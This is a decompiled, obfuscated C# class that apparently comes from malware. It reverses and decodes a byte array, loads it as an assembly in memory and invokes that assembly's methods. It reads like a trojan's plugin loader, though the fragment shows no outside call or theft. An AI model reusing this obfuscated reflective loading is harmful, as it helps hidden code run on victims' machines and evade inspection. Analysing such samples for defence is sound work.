using System;
using System.Linq;
using System.Reflection;
using System.Threading;

// Token: 0x02000006 RID: 6
internal static class Class1
{
	// Token: 0x06000011 RID: 17 RVA: 0x00006C44 File Offset: 0x00004E44
	internal static void smethod_0(GClass10 gclass10_0)
	{
		try
		{
			if (Class1.smethod_1(gclass10_0))
			{
				if (gclass10_0.Boolean_0)
				{
					Class1.smethod_2();
				}
				else
				{
					Class1.d();
				}
			}
		}
		catch (Exception ex)
		{
			Class9.i(ex.Message);
		}
	}

	// Token: 0x06000012 RID: 18 RVA: 0x00006C8C File Offset: 0x00004E8C
	private static bool smethod_1(GClass10 object_3)
	{
		bool result;
		try
		{
			if (object_3.GClass11_0.Byte_0 == null)
			{
				if (object_3.GClass11_0.Byte_0 == null)
				{
					byte[] array = Class7.smethod_0(object_3.GClass11_0.String_0);
					if (array == null)
					{
						Class9.h(object_3);
						return false;
					}
					if (Class1.object_0 == null && Class1.object_1 == null && Class1.fVfbyIimT == null && !object_3.Boolean_0)
					{
						return false;
					}
					if (Class1.object_0 != null && Class1.object_1 != null && Class1.fVfbyIimT != null)
					{
						return true;
					}
					if (array != null)
					{
						Class1.smethod_3(array);
						return true;
					}
				}
				return false;
			}
			Class7.smethod_1(object_3.GClass11_0.String_0, object_3.GClass11_0.Byte_0);
			Class1.smethod_3(object_3.GClass11_0.Byte_0);
			result = true;
		}
		catch
		{
			return false;
		}
		return result;
	}

	// Token: 0x06000013 RID: 19 RVA: 0x00002323 File Offset: 0x00000523
	private static void smethod_2()
	{
		Class1.object_1.Invoke(Class1.object_0, null);
	}

	// Token: 0x06000014 RID: 20 RVA: 0x00002336 File Offset: 0x00000536
	private static void d()
	{
		Class1.fVfbyIimT.Invoke(Class1.object_0, null);
	}

	// Token: 0x06000015 RID: 21 RVA: 0x00006D80 File Offset: 0x00004F80
	private static void smethod_3(byte[] object_3)
	{
		try
		{
			if (Class1.object_0 != null && Class1.object_1 != null && Class1.fVfbyIimT != null)
			{
				Class1.d();
				Thread.Sleep(2000);
				GC.Collect();
			}
		}
		catch
		{
		}
		Type type = Assembly.Load(GClass14.smethod_1(object_3.Reverse<byte>().ToArray<byte>())).GetExportedTypes()[0];
		Class1.object_0 = Activator.CreateInstance(type);
		Class1.object_1 = type.GetMethods()[0];
		Class1.fVfbyIimT = type.GetMethods()[1];
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00002308 File Offset: 0x00000508
	// Note: this type is marked as 'beforefieldinit'.
	static Class1()
	{
		Class16.kLjw4iIsCLsZtxc4lksN0j();
	}

	// Token: 0x06000017 RID: 23 RVA: 0x00002349 File Offset: 0x00000549
	internal static bool smethod_4()
	{
		return Class1.object_2 == null;
	}

	// Token: 0x0400000A RID: 10
	private static object object_0;

	// Token: 0x0400000B RID: 11
	private static MethodInfo object_1;

	// Token: 0x0400000C RID: 12
	private static MethodInfo fVfbyIimT;

	// Token: 0x0400000D RID: 13
	private static object object_2;
}
